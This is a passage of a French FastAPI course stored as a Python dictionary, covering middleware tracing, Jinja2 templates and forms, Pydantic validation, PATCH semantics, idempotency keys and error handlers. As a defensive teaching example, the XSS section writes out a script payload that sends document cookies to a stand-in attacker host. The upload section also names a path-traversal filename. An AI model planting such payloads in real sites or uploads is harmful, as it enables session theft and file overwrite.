                    "```http — Propagation de bout en bout de l'identifiant de corrélation\n"
                    "HTTP/1.1 200 OK\n"
                    "Content-Type: application/json\n"
                    "X-Request-ID: req-8f91a2b3c4d5\n"
                    "X-Response-Time-Ms: 1.84\n"
                    "X-Content-Type-Options: nosniff\n"
                    "```\n\n"
                    "Un middleware professionnel applique une règle de propagation coopérative : si le proxy amont ou le "
                    "client partenaire a déjà fourni un en-tête `X-Request-ID` sain, le middleware **le préserve** afin "
                    "de maintenir une trace unique de bout en bout ; s'il est absent, il en génère un cryptographiquement "
                    "unique via `uuid.uuid4().hex`. En inscrivant cet identifiant à la fois dans les journaux privés du "
                    "serveur et dans l'en-tête HTTP retourné au client, l'équipe d'astreinte reconstitue l'intégralité "
                    "d'une transaction en une fraction de seconde."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE VIE COMPLET D'UNE REQUÊTE AVEC @app.middleware(\"http\") FASTAPI :\n\n"
            "  Requête HTTP Entrante\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 1. Avant await call_next(request)                                |\n"
            "  |    -> heure_debut = time.perf_counter()                          |\n"
            "  |    -> request.state.request_id = \"req-a1b2c3d4\"                  |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v  response = await call_next(request)\n"
            "  +------------------------------------------------------------------+\n"
            "  | 2. Route Métier (@app.get(\"/api/rapports\"))                      |\n"
            "  |    -> Exécute le calcul / SQL et construit l'objet Response      |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 3. Après await call_next(request)                                |\n"
            "  |    -> Calcule duree_ms = (perf_counter() - heure_debut) * 1000   |\n"
            "  |    -> Ajoute Headers : X-Request-ID & X-Response-Time-Ms         |\n"
            "  |    -> Écrit le journal d'audit structuré et return response      |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  Réponse HTTP Sortante vers le Client"
        ),
        "reference_table": {
            "title": "Comparatif des Mécanismes d'Interception du Cycle de Vie dans FastAPI",
            "headers": ["Mécanisme FastAPI", "Moment d'exécution", "Arguments reçus", "Valeur de retour attendue"],
            "rows": [
                ["`@app.middleware(\"http\")`", "Autour de chaque requête HTTP (avant et après `call_next`)", "`(request: Request, call_next)`", "**Obligatoirement** un objet `Response`"],
                ["`Depends(...)` (Dépendance)", "Avant l'entrée dans les routes ciblées", "Paramètres HTTP (`Header`, `Query`, `Request`)", "Valeur injectée dans la route (ou `yield` avec nettoyage)"],
                ["`lifespan` (Context Manager)", "Au démarrage et à l'arrêt du serveur ASGI", "`(app: FastAPI)`", "`yield` (initialisation / fermeture globale)"],
                ["`@app.exception_handler(Exc)`", "Lorsqu'une exception HTTP ou métier survient", "`(request: Request, exc: Exc)`", "Un objet `JSONResponse` (ex: RFC 7807)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier l'instruction `return response` à la fin d'une fonction `@app.middleware(\"http\")`",
                "good": "Toujours terminer `@app.middleware(\"http\")` par `return response`",
                "why": "Si le middleware ne retourne pas `response`, Starlette/Uvicorn ne peut envoyer aucune réponse HTTP au client !"
            },
            {
                "bad": "Utiliser `time.time()` pour mesurer des durées d'exécution de quelques millisecondes",
                "good": "Utiliser l'horloge monotone haute précision `time.perf_counter()`",
                "why": "`time.perf_counter()` offre une résolution à la nanoseconde et n'est jamais faussé par les ajustements d'horloge NTP du système."
            }
        ],
        "practical_exercises": [
            "Exécutez le script `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer la génération automatique des en-têtes `X-Request-ID` et `X-Response-Time-Ms`.",
            "Transmettez un en-tête explicite `headers={\"X-Request-ID\": \"trace-isgp-001\"}` lors de l'appel `TestClient` et vérifiez que le middleware propage fidèlement cet identifiant sans l'écraser."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.5 : TEMPLATES JINJA2 (JINJA2TEMPLATES) & FORMULAIRES HTML (FORM / UPLOADFILE)
    # =========================================================================
    "d2-l5": {
        "context": (
            "Si les échanges machine-à-machine reposent universellement sur JSON, un serveur FastAPI d'entreprise "
            "doit fréquemment exposer en parallèle un **back-office d'administration**, un **portail de dépôt de "
            "pièces justificatives PDF** ou un **écran d'authentification unifié** directement rendus côté serveur "
            "(*Server-Side Rendering — SSR*).\n\n"
            "Deux écueils majeurs piègent régulièrement les ingénieurs qui abordent cette hybridation Web/API : "
            "assembler des chaînes HTML par interpolation `f\"<td>{saisie}</td>\"` au cœur des routes Python — ce qui "
            "ouvre instantanément la porte aux attaques critiques par **injection JavaScript (*Cross-Site Scripting / "
            "XSS*)** — et tenter de réceptionner un formulaire HTML natif `<form method=\"POST\">` à travers un schéma "
            "`BaseModel` JSON, alors que le navigateur encode ses données selon les normes MIME "
            "`application/x-www-form-urlencoded` (`Form(...)`) ou `multipart/form-data` (`UploadFile = File(...)`)."
        ),
        "deep_sections": [
            {
                "heading": "1. Moteur `Jinja2Templates` et neutralisation contextuelle des failles XSS (*Auto-Escaping*)",
                "body": (
                    "Dans une architecture FastAPI propre, le code Python ne contient jamais de balises HTML en dur : "
                    "les gabarits de présentation résident dans un répertoire dédié `templates/` et sont compilés en "
                    "bytecode Python par `Jinja2Templates(directory=\"templates\")`. Lorsqu'une route renvoie "
                    "`templates.TemplateResponse(request=request, name=\"catalogue.html\", context={...})`, Jinja2 "
                    "évalue les boucles `{% for f in formations %}` et les expressions `{{ f.titre }}` en appliquant "
                    "automatiquement un **échappement HTML contextuel**.\n\n"
                    "#### Anatomie d'une attaque *Stored XSS* et rempart d'échappement\n\n"
                    "Supposons qu'un attaquant enregistre comme intitulé de formation la charge utile "
                    "`<script>fetch('https://pirate.tld?c='+document.cookie)</script>`. Si le serveur concaténait cette "
                    "chaîne dans une *f-string* brute, le navigateur de l'administrateur interpréterait la balise "
                    "`<script>` comme du code légitime et l'exécuterait immédiatement. Avec Jinja2, chaque délimiteur "
                    "dangereux (`<`, `>`, `&`, `\"`, `'`) est transcodé à la volée en entité inoffensive (`&lt;script&gt;...`), "
                    "affichant littéralement le texte à l'écran sans jamais déclencher le moteur JavaScript."
                )
            },
            {
                "heading": "2. Encodage `application/x-www-form-urlencoded` et extraction déclarative `Form(...)`",
                "body": (
                    "Lorsqu'un opérateur humain clique sur le bouton de soumission d'un formulaire HTML standard "
                    "`<form method=\"POST\" action=\"/formations\">`, le navigateur ne sérialise **jamais** les champs "
                    "en JSON : il collecte tous les contrôles possédant un attribut **`name=\"...\"`** (l'attribut "
                    "`id=\"...\"` est purement local au DOM/CSS et n'est jamais transmis sur le réseau !) et construit "
                    "une charge utile encodée en pourcentage héritée de la spécification CGI.\n\n"
                    "```http — Trame brute émise par un navigateur lors d'un POST de formulaire HTML\n"
                    "POST /formations HTTP/1.1\n"
                    "Host: intranet.isgp.dz\n"
                    "Content-Type: application/x-www-form-urlencoded\n"
                    "Content-Length: 48\n"
                    "\n"
                    "titre=Architecture+ASGI&duree_jours=5&salle=Labo\n"
                    "```\n\n"
                    "Côté FastAPI, tenter de lier cette trame à un argument `payload: FormationCreate` échoue par `422` "
                    "car Starlette cherche un flux JSON. On déclare donc explicitement la provenance formulaire dans la "
                    "signature via **`titre: str = Form(..., min_length=3)`** (ce qui s'appuie en interne sur la "
                    "bibliothèque d'analyse en flux `python-multipart`)."
                )
            },
            {
                "heading": "3. Flux multipart (`UploadFile`), tampon `SpooledTemporaryFile` et patron `PRG` (`303 See Other`)",
                "body": (
                    "Dès qu'un formulaire inclut un sélecteur binaire `<input type=\"file\" name=\"syllabus_pdf\">`, "
                    "l'encodage URL devient impropre au transport d'octets arbitraires : la balise `<form>` doit "
                    "impérativement déclarer `enctype=\"multipart/form-data\"`. Le navigateur découpe alors le corps HTTP "
                    "en sections séparées par une frontière unique (`boundary=----WebKitFormBoundary...`), mêlant champs "
                    "texte (`Form(...)`) et flux binaires (`UploadFile = File(...)`).\n\n"
                    "> [!TIP] Pourquoi préférer `UploadFile` à `bytes = File(...)` dans FastAPI ?\n"
                    "> Déclarer `fichier: bytes = File(...)` force FastAPI à charger la totalité du fichier en mémoire RAM Python d'un seul bloc. À l'inverse, `UploadFile` enveloppe un `SpooledTemporaryFile` : tant que le fichier reste sous un seuil réduit (1 Mo), il demeure en RAM pour la vitesse ; au-delà, il bascule automatiquement sur disque temporaire et se lit par morceaux asynchrones (`await fichier.read(65536)`), protégeant vos workers Uvicorn contre la saturation mémoire.\n\n"
                    "Deux garde-fous complètent cette ingénierie en production : d'une part, **ne jamais faire confiance "
                    "à `fichier.filename`** sans l'assainir par `os.path.basename()` et une expression régulière stricte "
                    "afin de déjouer toute attaque *Path Traversal* (`../../etc/cron.d/backdoor`) ; d'autre part, "
                    "appliquer après validation le patron **Post / Redirect / Get (`PRG`)** en retournant "
                    "`RedirectResponse(url=\"/formations\", status_code=303)` (`303 See Other`), ce qui convertit "
                    "l'historique du navigateur en `GET` et empêche toute double création si l'utilisateur presse `F5`."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON DES 3 FORMATS D'ENVOI POST ET LEUR LECTURE DANS FASTAPI\n"
            "===================================================================\n\n"
            "  [1] FORMULAIRE HTML CLASSIQUE (<form method=\"POST\">)\n"
            "      Header  : Content-Type: application/x-www-form-urlencoded\n"
            "      Body    : titre=API+FastAPI&duree_jours=5&salle=Salle+A\n"
            "      FastAPI : titre: str = Form(...)  |  Réponse : templates.TemplateResponse(...)\n\n"
            "  [2] FORMULAIRE HTML AVEC FICHIER (<form method=\"POST\" enctype=\"multipart/form-data\">)\n"
            "      Header  : Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...\n"
            "      FastAPI : Texte -> Form(...)  +  Fichier -> document_pdf: UploadFile = File(None)\n\n"
            "  [3] CLIENT API / FETCH JAVASCRIPT / MOBILE\n"
            "      Header  : Content-Type: application/json\n"
            "      Body    : {\"titre\": \"API FastAPI\", \"duree_jours\": 5, \"salle\": \"Salle A\"}\n"
            "      FastAPI : payload: FormationCreate (BaseModel)  |  Réponse : JSON 201 Created"
        ),
        "reference_table": {
            "title": "Tableau Comparatif : Formulaires Web HTML (`Form` / `Jinja2Templates`) vs API JSON (`BaseModel`)",
            "headers": ["Caractéristique", "Formulaire HTML Classique", "Formulaire avec Fichier (Upload)", "Requête API REST (JSON)"],
            "rows": [
                ["En-tête `Content-Type`", "`application/x-www-form-urlencoded`", "`multipart/form-data`", "`application/json`"],
                ["Déclaration dans FastAPI", "`champ: str = Form(...)`", "`Form(...)` + `fichier: UploadFile = File(...)`", "`payload: BaseModel`"],
                ["Attribut HTML obligatoire", "`<input name=\"champ\">` (`name` et non `id`)", "`<form enctype=\"multipart/form-data\">`", "Clé de l'objet JSON `{\"champ\": ...}`"],
                ["Réponse FastAPI", "`templates.TemplateResponse(...)` (`HTMLResponse`)", "`TemplateResponse` ou `dict` JSON", "`return {...}` (`status_code=201`)"],
                ["Commande `curl` équivalente", "`curl -X POST -d \"titre=FastAPI&jours=5\" URL`", "`curl -X POST -F \"doc=@cours.pdf\" URL`", "`curl -X POST -H \"Content-Type: application/json\" -d '{...}' URL`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire du HTML en dur dans Python (`return HTMLResponse(f'<h1>Bonjour {nom}</h1>')`) au lieu d'utiliser `Jinja2Templates`",
                "good": "Placer tout le HTML dans `templates/fichier.html` et utiliser `templates.TemplateResponse(request, 'fichier.html', {'nom': nom})`",
                "why": "La concaténation HTML dans Python rend le code ingérable et expose l'application aux injections JavaScript (XSS), alors que Jinja2 échappe automatiquement les variables `{{ nom }}`."
            },
            {
                "bad": "Mettre uniquement `<input id=\"titre\">` dans un formulaire HTML en oubliant l'attribut `name=\"titre\"`",
                "good": "Toujours définir l'attribut `name=\"titre\"` sur chaque `<input>`, `<select>` et `<textarea>`",
                "why": "Le navigateur n'envoie au serveur que les champs possédant un attribut `name` ; sans `name`, le champ n'est jamais transmis !"
            },
            {
                "bad": "Utiliser un `BaseModel` JSON standard pour recevoir les données d'un `<form method=\"POST\">` HTML",
                "good": "Utiliser `Form(...)` pour un formulaire HTML (ou inspecter `request.headers.get('content-type')`)",
                "why": "Un formulaire HTML envoie `application/x-www-form-urlencoded` et non `application/json`."
            }
        ],
        "practical_exercises": [
            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja`, soumettez une nouvelle formation via le formulaire HTML et inspectez dans l'onglet Réseau la charge utile `application/x-www-form-urlencoded`.",
            "Saisissez volontairement un titre d'un seul caractère et une durée négative afin d'observer comment Jinja2 restitue proprement la liste des erreurs de validation dans l'interface."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.1 : CRUD MÉMOIRE, PYDANTIC V2 & RFC 7807 (400 vs 422)
    # =========================================================================
    "d3-l1": {
        "context": (
            "Tant qu'un serveur ne traite que des requêtes de consultation `GET`, son état interne demeure en lecture "
            "seule. Dès que l'on ouvre les opérations complètes du cycle **CRUD** — créer par `POST`, remplacer par "
            "`PUT`, amender par `PATCH` et détruire par `DELETE` — l'axiome fondateur de la cybersécurité applicative "
            "s'applique sans exception : **ne jamais accorder la moindre confiance aux octets émis par un client "
            "(*Never Trust User Input*)**.\n\n"
            "Un frontal Web buggé, un script partenaire mal encodé ou un attaquant utilisant `curl` peut expédier un "
            "JSON syntaxiquement tronqué, omettre une clé obligatoire, substituer un tableau à un entier ou injecter "
            "une durée négative `-15`. Ce chapitre détaille comment **Pydantic v2** (propulsé par son moteur Rust "
            "`pydantic-core`) érige un sas de validation déterministe à l'entrée de FastAPI, et comment restituer "
            "des diagnostics d'erreurs interopérables selon le standard **IETF RFC 7807 / RFC 9457 (`Problem Details`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Architecture de Pydantic v2 : schémas `BaseModel`, moteur Rust `pydantic-core` et `@field_validator`",
                "body": (
                    "Dans les frameworks dépourvus de validation déclarative, le développeur se retrouve contraint "
                    "d'écrire en tête de chaque route des dizaines de conditions défensives fragiles (`if \"titre\" not "
                    "in data or not isinstance(data[\"titre\"], str): ...`). FastAPI élimine intégralement ce code "
                    "impératif en confiant le contrat d'entrée à une sous-classe de **`pydantic.BaseModel`**.\n\n"
                    "#### Compilation du graphe de validation et modes d'exécution\n\n"
                    "Au moment où l'interpréteur Python importe votre classe `FormationCreate(BaseModel)`, Pydantic v2 "
                    "inspecte les annotations de type et les descripteurs **`Field(..., min_length=3, max_length=120, "
                    "ge=1, le=30)`** pour compiler une structure d'arbre de validation native exécutée en **Rust** au "
                    "sein de `pydantic-core` (jusqu'à vingt fois plus rapide que les validateurs Python purs). Lorsque "
                    "des invariants métier dépassent les simples bornes numériques — par exemple normaliser les espaces "
                    "via `.strip()` ou rejeter un intitulé ne contenant aucun caractère alphabétique — le décorateur "
                    "**`@field_validator(\"titre\")`** greffe une fonction Python exécutée juste après la vérification "
                    "structurelle Rust, toute levée de `ValueError` étant automatiquement convertie en rapport d'anomalie."
                )
            },
            {
                "heading": "2. Collecte exhaustive en une passe (`RequestValidationError`) et nuance `400` contre `422`",
                "body": (
                    "Rien n'est plus pénible pour l'utilisateur d'un portail administratif ou pour l'intégrateur d'un "
                    "progiciel partenaire qu'une API pratiquant le rejet « au premier obstacle » (*Fail-on-First-Error*) : "
                    "sur un formulaire de dix champs comportant quatre erreurs de saisie, l'appelant devrait soumettre "
                    "et corriger sa requête quatre fois d'affilée pour découvrir progressivement chaque anomalie.\n\n"
                    "Pydantic v2 résout ce problème ergonomique en parcourant **l'intégralité des champs du schéma en "
                    "une passe unique** avant de lever `RequestValidationError`. Le tableau `exc.errors()` répertorie "
                    "pour chaque violation son chemin exact (`loc`, par exemple `[\"body\", \"duree_jours\"]`), son "
                    "identifiant machine (`type`, tel que `greater_than_equal`) et son message explicatif.\n\n"
                    "> [!IMPORTANT] Distinguer rigoureusement `400 Bad Request`, `415` et `422 Unprocessable Content`\n"
                    "> Conformément à la RFC 9110, **`400 Bad Request`** sanctionne une charge utile syntaxiquement illisible (accolade JSON manquante, octets UTF-8 invalides), **`415 Unsupported Media Type`** signale un en-tête `Content-Type` incompatible, tandis que **`422 Unprocessable Content`** atteste que la syntaxe JSON a été parfaitement comprise mais que les valeurs violent la sémantique métier du contrat Pydantic."
                )
            },
            {
                "heading": "3. Normalisation industrielle des erreurs : la spécification IETF RFC 7807 / RFC 9457",
                "body": (
                    "Si chaque microservice d'une institution invente son propre dialecte d'erreur (`{\"erreur\": \"...\"}`, "
                    "`{\"fault\": {\"msg\": \"...\"}}`, `{\"ko\": true}`), les applications mobiles et passerelles API "
                    "doivent maintenir autant d'analyseurs spécifiques que de services amont. Pour unifier ces échanges, "
                    "l'IETF a standardisé le format **Problem Details for HTTP APIs (RFC 7807 consolidée par la RFC 9457)** "
                    "sous le type MIME dédié **`application/problem+json`**.\n\n"
                    "> « Ce document définit un format de détail de problème permettant d'embarquer des diagnostics lisibles par une machine dans une réponse HTTP sans avoir à inventer de nouveaux formats d'erreur pour chaque API. » — IETF RFC 9457 (Problem Details for HTTP APIs)\n\n"
                    "```json — Enveloppe d'erreur normalisée RFC 7807 / 9457 générée par FastAPI\n"
                    "{\n"
                    "  \"type\": \"https://api.isgp.dz/erreurs/validation-contrat\",\n"
                    "  \"title\": \"Données d'entrée non conformes au schéma\",\n"
                    "  \"status\": 422,\n"
                    "  \"detail\": \"2 champs du corps JSON ne respectent pas les contraintes métier.\",\n"
                    "  \"instance\": \"/api/v1/formations\",\n"
                    "  \"errors\": [\n"
                    "    {\"champ\": \"titre\", \"message\": \"String should have at least 3 characters\"},\n"
                    "    {\"champ\": \"duree_jours\", \"message\": \"Input should be greater than or equal to 1\"}\n"
                    "  ]\n"
                    "}\n"
                    "```"
                )
            }
        ],
        "architecture_diagram": (
            "ENTONNOIR DE VALIDATION DÉFENSIVE D'UNE REQUÊTE POST / PUT :\n\n"
            "  Requête POST entrante\n"
            "        |\n"
            "        +---> 1. Le Body est-il un objet JSON syntaxiquement valide ?\n"
            "        |        NON ---> Retour immédiat : HTTP 400 Bad Request (Syntaxe illisible)\n"
            "        |\n"
            "        +---> 2. Les champs respectent-ils les types et bornes métier (len >= 3, 1 <= duree <= 30) ?\n"
            "        |        NON ---> Retour immédiat : HTTP 422 Unprocessable Entity (Format RFC 7807 + liste 'errors')\n"
            "        |\n"
            "        v     3. OUI ---> Insertion en base + Retour HTTP 201 Created + En-tête Location"
        ),
        "reference_table": {
            "title": "Distinction Précise des Codes HTTP lors de la Création / Validation (`POST`)",
            "headers": ["Code HTTP", "Situation précise", "Exemple d'entrée client", "Action attendue côté client"],
            "rows": [
                ["**`201 Created`**", "Création réussie de la ressource", "`{\"titre\": \"Architecture API\", \"duree_jours\": 5}`", "Lire la nouvelle ressource créée (et son nouvel `id`)"],
                ["**`400 Bad Request`**", "JSON cassé ou illisible", "`{\"titre\": \"API\",` (accolade fermante oubliée)", "Corriger la syntaxe JSON du programme client"],
                ["**`415 Unsupported Media Type`**", "En-tête `Content-Type` manquant ou erroné", "Envoi en `text/plain` au lieu de `application/json`", "Ajouter `-H \"Content-Type: application/json\"`"],
                ["**`422 Unprocessable Entity`**", "JSON valide mais règles métier violées", "`{\"titre\": \"AB\", \"duree_jours\": -5}`", "Afficher les messages de `errors` sur les champs du formulaire"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Supposer que parce que le Frontend JavaScript valide le formulaire, le Backend FastAPI n'a pas besoin de valider",
                "good": "Toujours appliquer 100 % des validations de types et de bornes dans le Backend Python avec Pydantic",
                "why": "Un attaquant utilise `curl` ou un script Python pour appeler directement votre API en contournant totalement l'interface Web !"
            },
            {
                "bad": "Renvoyer `200 OK` sur un `POST` qui crée un nouvel enregistrement",
                "good": "Renvoyer `201 Created` (`status_code=201`) accompagné de l'en-tête `Location: /api/formations/{new_id}`",
                "why": "`201 Created` indique explicitement qu'un nouvel état a été persisté avec succès."
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus pour observer l'agrégation simultanée de plusieurs violations Pydantic au sein d'un seul document `application/problem+json`.",
            "Utilisez le bouton « Tester POST /api/sandbox/formations » afin de persister une nouvelle formation valide et vérifiez la présence du code `201 Created` ainsi que de l'en-tête `Location`."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.2 : PUT VS PATCH & IDEMPOTENCE POST (IDEMPOTENCY-KEY)
    # =========================================================================
    "d3-l2": {
        "context": (
            "Dans les systèmes transactionnels critiques — paiement interbancaire, billetterie, enrôlement académique "
            "ou facturation — deux subtilités protocolaires séparent les APIs amateurs des infrastructures résilientes. "
            "Premièrement, comment modifier un dossier existant sans écraser accidentellement par `null` les colonnes "
            "que le client n'a pas souhaité toucher (`PUT` contre `PATCH`) ?\n\n"
            "Deuxièmement, comment garantir qu'un usager dont la connexion mobile 4G s'interrompt une demi-seconde "
            "après avoir cliqué sur « Régler les frais d'inscription » — provoquant un réessai automatique de son "
            "téléphone — ne sera **jamais débité deux fois** ? Ce chapitre dissèque la mécanique interne de "
            "`model_dump(exclude_unset=True)` dans Pydantic v2 et implémente le patron industriel **`Idempotency-Key`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Remplacement intégral (`PUT`, RFC 9110) contre mutation partielle (`PATCH`, RFC 5789)",
                "body": (
                    "Bien que `PUT` et `PATCH` servent tous deux à mettre à jour une ressource existante identifiée par "
                    "son URI (`/api/v1/formations/1`), leurs contrats sémantiques sont diamétralement opposés. La "
                    "méthode **`PUT`** ordonne le **remplacement intégral** de la représentation stockée à cette adresse "
                    "par le document joint dans la requête : le client est tenu de transmettre tous les champs du schéma, "
                    "et tout champ optionnel omis est légitimement réinitialisé à sa valeur par défaut.\n\n"
                    "À l'inverse, la méthode **`PATCH` (IETF RFC 5789)** exprime un **différentiel partiel** : si un "
                    "coordinateur souhaite uniquement transférer la formation dans la `\"Salle B\"`, il n'expédie que "
                    "`{\"salle\": \"Salle B\"}` en exigeant que le `titre` et la `duree_jours` demeurent strictement "
                    "inchangés.\n\n"
                    "#### Le registre interne `model_fields_set` de Pydantic v2\n\n"
                    "Si vous définissez un modèle `FormationPatch` où chaque attribut vaut `None` par défaut "
                    "(`titre: str | None = None`) et que vous appliquez naïvement `payload.model_dump()`, tous les champs "
                    "omis ressortent à `None` et détruisent votre base de données ! Pydantic v2 résout brillamment cette "
                    "ambiguïté en mémorisant dans `payload.model_fields_set` l'ensemble exact des clés physiquement "
                    "présentes dans le JSON reçu.\n\n"
                    "```python — Extraction chirurgicale des seuls champs envoyés par le client\n"
                    "class FormationPatch(BaseModel):\n"
                    "    titre: str | None = Field(default=None, min_length=3)\n"
                    "    duree_jours: int | None = Field(default=None, ge=1, le=30)\n"
                    "    salle: str | None = None\n\n"
                    "# Si le client envoie uniquement {\"salle\": \"Salle B\"} :\n"
                    "modifications = payload.model_dump(exclude_unset=True)  # -> {'salle': 'Salle B'}\n"
                    "```"
                )
            },
            {
                "heading": "2. Le péril des pannes grises (*Ack Lost*) sur les mutations `POST` non idempotentes",
                "body": (
                    "En algèbre protocolaire (RFC 9110, Section 9.2.2), une opération est dite **idempotente** lorsque "
                    "l'appliquer une fois ou dix fois consécutives avec la même charge utile laisse le serveur dans un "
                    "**état final strictement identique** : `GET`, `PUT` et `DELETE` possèdent naturellement cette "
                    "propriété. Le verbe **`POST`**, en revanche, n'est **pas idempotent** : chaque réception crée par "
                    "défaut une nouvelle ligne SQL ou déclenche un nouveau virement.\n\n"
                    "Considérons la panne dite de « perte d'accusé de réception » (*Lost Acknowledgment*), quotidienne "
                    "sur les réseaux cellulaires : l'application mobile émet `POST /api/v1/paiements` (`25 000 DZD`), "
                    "votre worker FastAPI valide la transaction en base et expédie `201 Created`, mais le tunnel radio 4G "
                    "bascule d'antenne avant que les octets de réponse n'atteignent le téléphone. Recevant une exception "
                    "`ReadTimeout`, le SDK mobile ignore si le paquet s'est perdu à l'aller ou au retour : s'il "
                    "réessaie automatiquement sans garde-fou, le compte bancaire est débité une seconde fois !"
                )
            },
            {
                "heading": "3. Machine à états d'idempotence : l'en-tête `Idempotency-Key` (Standard IETF / Stripe)",
                "body": (
                    "Pour conférer une idempotence mathématique à `POST`, l'industrie financière (Stripe, Adyen, PayPal "
                    "et le brouillon normatif IETF *Idempotency-Key HTTP Header Field*) déporte la génération d'un "
                    "jeton d'intention unique côté appelant.\n\n"
                    "> [!WARNING] L'`Idempotency-Key` doit impérativement être forgée par le Client avant le 1er essai\n"
                    "> Au moment précis où l'utilisateur presse « Payer », le client génère un `UUID v4` (`Idempotency-Key: 9b2f4e10-7c1a...`) et le conserve pour toute tentative de réessai de cette même opération. Ce n'est qu'une fois une toute nouvelle intention initiée qu'un nouvel UUID est tiré.\n\n"
                    "Côté FastAPI, le serveur inspecte cet en-tête avant toute écriture : si la clé est absente du "
                    "magasin d'idempotence (table SQL contrainte `UNIQUE` ou cache **Redis** assorti d'un TTL de 24 h "
                    "et d'une empreinte SHA-256 du corps JSON pour détecter toute réutilisation erronée de la clé sur un "
                    "autre montant), la transaction est exécutée et sa réponse exacte (`status_code` + corps sérialisé) "
                    "est scellée sous cette clé. Lorsqu'un réessai porteur du même `Idempotency-Key` se présente, "
                    "FastAPI court-circuite intégralement le moteur métier et rejoue la réponse mise en cache en y "
                    "adjoignant l'en-tête d'audit `X-Idempotent-Replay: true`."
                )
            }
        ],
        "architecture_diagram": (
            "PROTECTION ANTI-DOUBLON PAR EN-TÊTE 'Idempotency-Key' SUR UN POST :\n\n"
            "  Appel #1 : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' inconnue en cache\n"
            "     |---> Exécute la transaction #1 en base SQL\n"
            "     |---> Sauvegarde CACHE['uuid-123'] = Réponse #1\n"
            "     +---> (Coupure réseau 4G avant réception par le téléphone !)\n\n"
            "  Appel #2 (Réessai automatique) : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' TROUVÉE dans CACHE !\n"
            "     |---> [AUCUNE écriture en base SQL — Doublon évité !]\n"
            "     +---> Renvoie immédiatement CACHE['uuid-123'] (avec X-Idempotent-Replay: true)"
        ),
        "reference_table": {
            "title": "Comparatif Technique : `POST` vs `PUT` vs `PATCH`",
            "headers": ["Critère", "`POST /api/formations`", "`PUT /api/formations/1`", "`PATCH /api/formations/1`"],
            "rows": [
                ["**Cible URL**", "Collection (`/formations`)", "Ressource précise (`/formations/1`)", "Ressource précise (`/formations/1`)"],
                ["**Rôle sémantique**", "Créer une nouvelle ressource", "Remplacer intégralement la ressource `#1`", "Modifier partiellement certains champs de `#1`"],
                ["**Champs requis dans le JSON**", "Tous les champs obligatoires", "Tous les champs de la ressource", "Uniquement le(s) champ(s) à modifier"],
                ["**Idempotent par nature ?**", "Non (nécessite `Idempotency-Key`)", "**Oui**", "Oui (si mise à jour par valeur fixe)"],
                ["**Code HTTP de succès**", "`201 Created`", "`200 OK`", "`200 OK`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écraser les champs non fournis par `None` lors d'une requête `PATCH`",
                "good": "Dans un `PATCH` FastAPI, utiliser `modifs = payload.model_dump(exclude_unset=True)` pour n'extraire que les champs réellement transmis",
                "why": "Le principe même de `PATCH` est de laisser intacts tous les champs qui ne figurent pas dans le JSON envoyé."
            },
            {
                "bad": "Générer l'`Idempotency-Key` côté serveur au lieu de la faire générer par le client",
                "good": "C'est toujours le **Client** qui génère l'UUID de l'`Idempotency-Key` avant son 1er essai et le réutilise en cas de réessai",
                "why": "Si le serveur générait la clé à chaque requête entrante, il ne pourrait jamais savoir que deux appels successifs correspondent à la même intention du client."
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus pour constater que deux requêtes `POST` successives partageant la même `Idempotency-Key` n'incrémentent le compteur de transactions qu'une seule fois.",
            "Dans l'onglet **curl & Postman**, exécutez la requête `PATCH` sur `/api/sandbox/formations/1` afin de modifier exclusivement la salle tout en vérifiant que le titre demeure intact."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.3 : GESTIONNAIRES D'EXCEPTIONS GLOBAUX (@APP.EXCEPTION_HANDLER)
    # =========================================================================
    "d3-l3": {
        "context": (
            "Un contrat d'API ne se juge pas à l'élégance de ses réponses `200 OK`, mais à la cohérence irréprochable "
            "de ses défaillances. Par défaut, lorsqu'une URL est introuvable (`404`), qu'un verbe HTTP est rejeté "
            "(`405`), qu'un corps échoue à la validation Pydantic (`422`) ou qu'une exception Python imprévue éclate "
            "(`500`), les structures de réponse diffèrent (`{\"detail\": \"Not Found\"}` contre un tableau `detail: [...]` "
            "ou du texte brut `Internal Server Error`), brisant les analyseurs d'erreurs des SDK clients.\n\n"
            "Plus critique encore sur le plan de la sécurité (référentiel **MITRE CWE-209 — Information Exposure "
            "Through an Error Message**), laisser fuiter une trace d'exécution Python ou un message d'erreur SQL brut "
            "offre à un attaquant la cartographie exacte de vos tables et de vos chemins disque. Ce chapitre orchestre "
            "le bouclier global **`@app.exception_handler`** de FastAPI et Starlette."
        ),
        "deep_sections": [
            {
                "heading": "1. Hiérarchie d'interception de Starlette : `ExceptionMiddleware` contre `ServerErrorMiddleware`",
                "body": (
                    "Pour maîtriser la gestion d'erreurs dans FastAPI, il faut comprendre que Starlette superpose deux "
                    "filets distincts autour de vos routes. Le filet interne, **`ExceptionMiddleware`**, intercepte "
                    "toutes les exceptions métier et protocolaires connues : `StarletteHTTPException` (qui englobe les "
                    "`404` et `405` générés par le routeur ainsi que vos propres `fastapi.HTTPException`) et "
                    "`RequestValidationError` (levée par Pydantic v2).\n\n"
                    "En déclarant **`@app.exception_handler(StarletteHTTPException)`** — attention à bien cibler la "
